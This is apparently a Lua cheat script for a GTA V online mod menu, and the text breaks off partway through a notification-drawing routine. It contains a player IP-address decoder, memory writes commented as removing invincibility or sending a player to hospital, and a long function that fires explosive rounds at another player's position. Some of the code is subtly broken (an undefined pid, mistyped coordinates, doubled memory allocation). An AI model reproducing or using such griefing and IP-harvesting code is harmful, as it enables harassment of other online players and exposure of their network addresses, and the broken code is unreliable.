function random_golf_outfit(freemode_ped)
    if (ENTITY.GET_ENTITY_MODEL(freemode_ped) == util.joaat("mp_f_freemode_01")) then
        PED.SET_PED_COMPONENT_VARIATION(freemode_ped, 3, 14, 0, 0)
        PED.SET_PED_COMPONENT_VARIATION(freemode_ped, 11, math.random(400, 401), get_random_drawable_variation(freemode_ped, 11, math.random(400, 401)), 0)
        PED.SET_PED_COMPONENT_VARIATION(freemode_ped, 4, 137, get_random_drawable_variation(freemode_ped, 4, 137), 0)
        PED.SET_PED_COMPONENT_VARIATION(freemode_ped, 6, 103, get_random_drawable_variation(freemode_ped, 6, 103), 0)
    else
        PED.SET_PED_COMPONENT_VARIATION(freemode_ped, 3, 0, 0, 0)
        PED.SET_PED_COMPONENT_VARIATION(freemode_ped, 11, math.random(382, 383), get_random_drawable_variation(freemode_ped, 11, math.random(382, 383)), 0)
        PED.SET_PED_COMPONENT_VARIATION(freemode_ped, 4, 12, select(math.random(1, 5), 0, 4, 5, 7, 12), 0)
        PED.SET_PED_COMPONENT_VARIATION(freemode_ped, 6, 99, get_random_drawable_variation(freemode_ped, 6, 99), 0)
    end
end
--获取信息
function intToIp(num)
    ip = ""
    local int16 = string.format("%x", num)
    for i = 1, #int16 do
      if 0 == math.fmod(i, 2) then
        if ip ~= "" then
          ip = ip .. "." .. var_int
        else
          ip = var_int
        end
      else
        var_int = tostring(tonumber(string.sub(int16, i, i + 1), 16))
      end
    end
    return ip
end
--移除无敌/送到医院
function setBit(addr: number, bit: number)
	memory.write_int(addr, memory.read_int(addr) | 1 << bit)
end
function clearBit(addr: number, bit: number)
	memory.write_int(addr, memory.read_int(addr) ~ 1 << bit)
end
--飞天炸弹
function boomfly(a)
local offset = v3(0, 0, 0)
    local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local pos = ENTITY.GET_ENTITY_COORDS(ped)
    airshash = util.joaat("vehicle_weapon_trailer_dualaa")
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z- 1 , pos.x, pos.y, pos.z - 1, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x+2, pos.y, pos.z- 1 , pos.x+2, pos.y, pos.z - 1, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-2, pos.y, pos.z- 1 , pos.x-2, pos.y, pos.z - 1, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-2, pos.y-2, pos.z- 1 , pos.x-2, pos.y-2, pos.z - 1, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-2, pos.y+2, pos.z- 1 , pos.x-2, pos.y+2, pos.z - 1, 10000, true, airshash, players.user_ped(), false, true, 10000)
    wait(100)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z+ 1 , pos.x, pos.y, pos.z + 1, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x+2, pos.y, pos.z+ 1 , pos.x+2, pos.y, pos.z + 1, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-2, pos.y, pos.z+ 1 , pos.x-2, pos.y, pos.z + 1, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-2, pos.y-2, pos.z+ 1 , pos.x-2, pos.y-2, pos.z + 1, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-2, pos.y+2, pos.z+ 1 , pos.x-2, pos.y+2, pos.z + 1, 10000, true, airshash, players.user_ped(), false, true, 10000)
    wait(100)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z+ 3 , pos.x, pos.y, pos.z + 3, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x+2, pos.y, pos.z+ 3, pos.x+2, pos.y, pos.z + 3, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-2, pos.y, pos.z+ 3, pos.x-2, pos.y, pos.z + 3, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-2, pos.y-2, pos.z+ 3 , pos.x-2, pos.y-2, pos.z + 3, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-2, pos.y+2, pos.z+ 3 , pos.x-2, pos.y+2, pos.z + 3, 10000, true, airshash, players.user_ped(), false, true, 10000)
    wait(100)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z+ 5, pos.x, pos.y, pos.z + 5, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x+2, pos.y, pos.z+ 5 , pos.x+2, pos.y, pos.z + 5, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-2, pos.y, pos.z+ 5 , pos.x-2, pos.y, pos.z + 5, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-2, pos.y-2, pos.z+ 5, pos.x-2, pos.y-2, pos.z + 5, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-2, pos.y+2, pos.z+ 5 , pos.x-2, pos.y+2, pos.z + 5, 10000, true, airshash, players.user_ped(), false, true, 10000)
    wait(100)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z+ 7 , pos.x, pos.y, pos.z + 7, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x+2, pos.y, pos.z+ 7 , pos.x+2, pos.y, pos.z + 7, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-2, pos.y, pos.z+ 7 , pos.x-2, pos.y, pos.z + 7, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-2, pos.y-2, pos.z+ 7 , pos.x-2, pos.y-2, pos.z + 7, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-2, pos.y+2, pos.z+ 7 , pos.x-2, pos.y+2, pos.z + 7, 10000, true, airshash, players.user_ped(), false, true, 10000)
    wait(100)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z+ 9 , pos.x, pos.y, pos.z + 9, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x+2, pos.y, pos.z+ 9 , pos.x+2, pos.y, pos.z + 9, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-2, pos.y, pos.z+ 9 , pos.x-2, pos.y, pos.z + 9, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-2, pos.y-2, pos.z+ 9 , pos.x-2, pos.y-2, pos.z + 9, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-2, pos.y+2, pos.z+ 9 , pos.x-2, pos.y+2, pos.z + 9, 10000, true, airshash, players.user_ped(), false, true, 10000)
    wait(100)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z+ 11 , pos.x, pos.y, pos.z + 11, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x+2, pos.y, pos.z+ 11 , pos.x+2, pos.y, pos.z + 11, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-2, pos.y, pos.z+ 11 , pos.x-2, pos.y, pos.z + 11, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-2, pos.y-2, pos.z+ 11 , pos.x-2, pos.y-2, pos.z + 11, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-2, pos.y+2, pos.z+ 11 , pos.x-2, pos.y+2, pos.z + 11, 10000, true, airshash, players.user_ped(), false, true, 10000)
    wait(100)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z+ 13 , pos.x, pos.y, pos.z + 13, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x+2, pos.y, pos.z+ 13 , pos.x+2, pos.y, pos.z + 13, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-2, pos.y, pos.z+ 13 , pos.x-2, pos.y, pos.z + 13, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-2, pos.y-2, pos.z+ 13 , pos.x-2, pos.y-2, pos.z + 13, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-2, pos.y+2, pos.z+ 13 , pos.x-2, pos.y+2, pos.z + 13, 10000, true, airshash, players.user_ped(), false, true, 10000)
    wait(100)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z+ 15 , pos.x, pos.y, pos.z + 15, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x+2, pos.y, pos.z+ 15 , pos.x+2, pos.y, pos.z + 15, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-2, pos.y, pos.z+ 15 , pos.x-2, pos.y, pos.z + 15, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-2, pos.y-2, pos.z+ 15 , pos.x-2, pos.y-2, pos.z + 15, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-2, pos.y+2, pos.z+ 15 , pos.x-2, pos.y+2, pos.z + 15, 10000, true, airshash, players.user_ped(), false, true, 10000)
    wait(100)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z+ 17 , pos.x, pos.y, pos.z + 17, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x+2, pos.y, pos.z+ 17 , pos.x+2, pos.y, pos.z + 17, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-2, pos.y, pos.z+ 17 , pos.x-2, pos.y, pos.z + 17, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-2, pos.y-2, pos.z+ 17 , pos.x-2, pos.y-2, pos.z + 17, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-2, pos.y+2, pos.z+ 17 , pos.x-2, pos.y+2, pos.z + 17, 10000, true, airshash, players.user_ped(), false, true, 10000)
    wait(100)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z+ 19 , pos.x, pos.y, pos.z + 19, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x+2, pos.y, pos.z+ 19 , pos.x+2, pos.y, pos.z + 19, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-2, pos.y, pos.z+ 19 , pos.x-2, pos.y, pos.z + 19, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-2, pos.y-2, pos.z+ 19 , pos.x-2, pos.y-2, pos.z + 19, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-2, pos.y+2, pos.z+ 19 , pos.x-2, pos.y+2, pos.z + 19, 10000, true, airshash, players.user_ped(), false, true, 10000)
    wait(100)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z+ 21 , pos.x, pos.y, pos.z + 21, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x+2, pos.y, pos.z+ 21 , pos.x+2, pos.y, pos.z + 21, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-2, pos.y, pos.z+ 21 , pos.x-2, pos.y, pos.z + 21, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-2, pos.y-2, pos.z+ 21 , pos.x-2, pos.y-2, pos.z + 21, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-2, pos.y+2, pos.z+ 21 , pos.x-2, pos.y+2, pos.z + 21, 10000, true, airshash, players.user_ped(), false, true, 10000)
    wait(100)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z+ 23 , pos.x, pos.y, pos.z + 23, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x+2, pos.y, pos.z+ 23 , pos.x+2, pos.y, pos.z + 23, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-2, pos.y, pos.z+ 23 , pos.x-2, pos.y, pos.z + 23, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-2, pos.y-2, pos.z+ 23 , pos.x-2, pos.y-2, pos.z + 23, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-2, pos.y+2, pos.z+ 23 , pos.x-2, pos.y+2, pos.z + 23, 10000, true, airshash, players.user_ped(), false, true, 10000)
    wait(100)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z+ 25 , pos.x, pos.y, pos.z + 25, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x+2, pos.y, pos.z+ 25 , pos.x+2, pos.y, pos.z + 25, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-2, pos.y, pos.z+ 25 , pos.x-2, pos.y, pos.z + 25, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-2, pos.y-2, pos.z+ 25 , pos.x-2, pos.y-2, pos.z + 25, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-2, pos.y+2, pos.z+ 25 , pos.x-2, pos.y+2, pos.z + 25, 10000, true, airshash, players.user_ped(), false, true, 10000)
    wait(100)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z+ 27 , pos.x, pos.y, pos.z + 27, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x+2, pos.y, pos.z+ 27 , pos.x+2, pos.y, pos.z + 27, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-2, pos.y, pos.z+ 27 , pos.x-2, pos.y, pos.z + 27, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-2, pos.y-2, pos.z+ 27 , pos.x-2, pos.y-2, pos.z + 27, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-2, pos.y+2, pos.z+ 27 , pos.x-2, pos.y+2, pos.z + 27, 10000, true, airshash, players.user_ped(), false, true, 10000)
    wait(100)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z+ 29 , pos.x, pos.y, pos.z + 29, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x+2, pos.y, pos.z+ 29 , pos.x+2, pos.y, pos.z + 29, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-2, pos.y, pos.z+ 29 , pos.x-2, pos.y, pos.z + 29, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-2, pos.y-2, pos.z+ 29 , pos.x-2, pos.y-2, pos.z + 29, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-2, pos.y+2, pos.z+ 29 , pos.x-2, pos.y+2, pos.z + 29, 10000, true, airshash, players.user_ped(), false, true, 10000)
    wait(100)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z+ 31 , pos.x, pos.y, pos.z + 31, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x+2, pos.y, pos.z+ 31 , pos.x+2, pos.y, pos.z + 31, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-2, pos.y, pos.z+ 31 , pos.x-2, pos.y, pos.z + 31, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-2, pos.y-2, pos.z+ 31 , pos.x-2, pos.y-2, pos.z + 31, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-2, pos.y+2, pos.z+ 31 , pos.x-2, pos.y+2, pos.z + 31, 10000, true, airshash, players.user_ped(), false, true, 10000)
    wait(100)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z+ 33 , pos.x, pos.y, pos.z + 33, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x+2, pos.y, pos.z+ 33 , pos.x+2, pos.y, pos.z + 33, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-22, pos.y, pos.z+ 33 , pos.x-2, pos.y, pos.z + 33, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-2, pos.y-2, pos.z+ 33 , pos.x-2, pos.y-2, pos.z + 33, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-2, pos.y+2, pos.z+ 33 , pos.x-2, pos.y+2, pos.z + 3, 10000, true, airshash, players.user_ped(), false, true, 10000)
    wait(100)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z+ 35 , pos.x, pos.y, pos.z + 35, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x+2, pos.y, pos.z+ 35 , pos.x+2, pos.y, pos.z + 35, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-2, pos.y, pos.z+ 35 , pos.x-2, pos.y, pos.z + 35, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-22, pos.y-2, pos.z+ 35 , pos.x-2, pos.y-2, pos.z + 35, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-2, pos.y+2, pos.z+ 35 , pos.x-2, pos.y+2, pos.z + 35, 10000, true, airshash, players.user_ped(), false, true, 10000)
    wait(100)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z+ 37 , pos.x, pos.y, pos.z + 37, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x+2, pos.y, pos.z+ 37 , pos.x+2, pos.y, pos.z + 37, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-2, pos.y, pos.z+ 37 , pos.x-2, pos.y, pos.z + 37, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-2, pos.y-2, pos.z+ 37 , pos.x-2, pos.y-2, pos.z + 37, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-2, pos.y+2, pos.z+ 37 , pos.x-2, pos.y+2, pos.z + 37, 10000, true, airshash, players.user_ped(), false, true, 10000)
    wait(100)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z+ 39 , pos.x, pos.y, pos.z + 39, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x+2, pos.y, pos.z+ 39 , pos.x+2, pos.y, pos.z + 39, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-2, pos.y, pos.z+ 39 , pos.x-2, pos.y, pos.z + 39, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-2, pos.y-2, pos.z+ 39 , pos.x-2, pos.y-2, pos.z + 39, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-2, pos.y+2, pos.z+ 39 , pos.x-2, pos.y+2, pos.z + 39, 10000, true, airshash, players.user_ped(), false, true, 10000)
    wait(100)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z+ 41 , pos.x, pos.y, pos.z + 41, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x+2, pos.y, pos.z+ 41 , pos.x+2, pos.y, pos.z + 41, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-2, pos.y, pos.z+ 41 , pos.x-2, pos.y, pos.z + 41, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-2, pos.y-2, pos.z+ 41 , pos.x-2, pos.y-2, pos.z + 41, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-2, pos.y+2, pos.z+ 41 , pos.x-2, pos.y+2, pos.z + 41, 10000, true, airshash, players.user_ped(), false, true, 10000)
    wait(100)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z+ 43 , pos.x, pos.y, pos.z + 43, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x+2, pos.y, pos.z+ 43 , pos.x+2, pos.y, pos.z + 43, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-2, pos.y, pos.z+ 43 , pos.x-2, pos.y, pos.z + 43, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-2, pos.y-2, pos.z+ 43 , pos.x-2, pos.y-2, pos.z + 43, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-2, pos.y+2, pos.z+ 43 , pos.x-2, pos.y+2, pos.z + 43, 10000, true, airshash, players.user_ped(), false, true, 10000)
    wait(100)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z+ 45 , pos.x, pos.y, pos.z + 45, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x+2, pos.y, pos.z+ 45 , pos.x+2, pos.y, pos.z + 45, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-2, pos.y, pos.z+ 45 , pos.x-2, pos.y, pos.z + 45, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-2, pos.y-2, pos.z+ 45 , pos.x-2, pos.y-2, pos.z + 45, 10000, true, airshash, players.user_ped(), false, true, 10000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x-2, pos.y+2, pos.z+ 45 , pos.x-2, pos.y+2, pos.z + 45, 10000, true, airshash, players.user_ped(), false, true, 10000)
end
function pid_to_handle(pid)
NETWORK.NETWORK_HANDLE_FROM_PLAYER(pid, memory.alloc(13*8), 13)
    return memory.alloc(13*8)
end
function newColor(R, G, B, A)
    return {
        r = R,
        g = G,
        b = B,
        a = A
    }
end
function New.colour(R, G, B, A)
    return {
        r = R / 255,
        g = G / 255,
        b = B / 255,
        a = A or 1
    }
end
local white = New.colour(255, 255, 255)
local darkBlue = New.colour(132, 207, 255)
b_notifications = {}
b_notifications.new = function()
    local self = {}
    local active_notifs = {}
    self.notif_padding = 0.005
    self.notif_text_size = 0.5
    self.notif_title_size = 0.55
    self.notif_spacing = 0.015
    self.notif_width = 0.17
    self.notif_flash_duration = 1
    self.notif_anim_speed = 1
    self.notif_banner_colour = {
        r = 1,
        g = 0.51,
        b = 0.61,
        a = 1
    }
    self.notif_flash_colour = {
        r = 1,
        g = 0.34,
        b = 0.47,
        a = 1
    }
    self.max_notifs = 10
    self.notif_banner_height = 0.002
    self.use_toast = false
    local split = function(input, sep)
        local t = {}
        for str in string.gmatch(input, "([^" .. sep .. "]+)") do
            table.insert(t, str)
        end
        return t
    end
    local function lerp(a, b, t)
        return a + (b - a) * t
    end
    local cut_string_to_length = function(input, length, fontSize)
        input = split(input, " ")
        local output = {}
        local line = ""
        for i, word in ipairs(input) do
            if directx.get_text_size(line .. word, fontSize) >= length then
                if directx.get_text_size(word, fontSize) > length then
                    while directx.get_text_size(word, fontSize) > length do
                        local word_lenght = string.len(word)
                        for x = 1, word_lenght, 1 do
                            if directx.get_text_size(line .. string.sub(word, 1, x), fontSize) > length then
                                output[#output + 1] = line .. string.sub(word, 1, x - 1)
                                line = ""
                                word = string.sub(word, x, word_lenght)
                                break
                            end
                        end
                    end
                else
                    output[#output + 1] = line
                    line = ""
                end
            end
            if i == #input then
                output[#output + 1] = line .. word
            end
            line = line .. word .. " "
        end
        return table.concat(output, "\n")
    end
    local draw_notifs = function()
        local aspect_16_9 = 1.78
        util.create_tick_handler(function()
            local total_height = 0
            local delta_time = MISC.GET_FRAME_TIME()
            for i = #active_notifs, 1, -1 do
                local notif = active_notifs[i]
                local notif_body_colour = notif.colour
                if notif.flashtimer > 0 then
                    notif_body_colour = self.notif_flash_colour
                    notif.flashtimer = notif.flashtimer - delta_time
                end
                if notif.current_y_pos == -9 then
                    notif.current_y_pos = total_height
                end
                notif.current_y_pos = lerp(notif.current_y_pos, total_height, 5 * delta_time * self.notif_anim_speed)
                if not notif.marked_for_deletetion then
                    notif.animation_state = lerp(notif.animation_state, 1, 10 * delta_time * self.notif_anim_speed)
                end
                directx.draw_rect(1 - self.notif_width - self.notif_padding * 2,
                    0.1 - self.notif_padding * 2 * aspect_16_9 + notif.current_y_pos,
                    self.notif_width + (self.notif_padding * 2), (notif.text_height + notif.title_height +
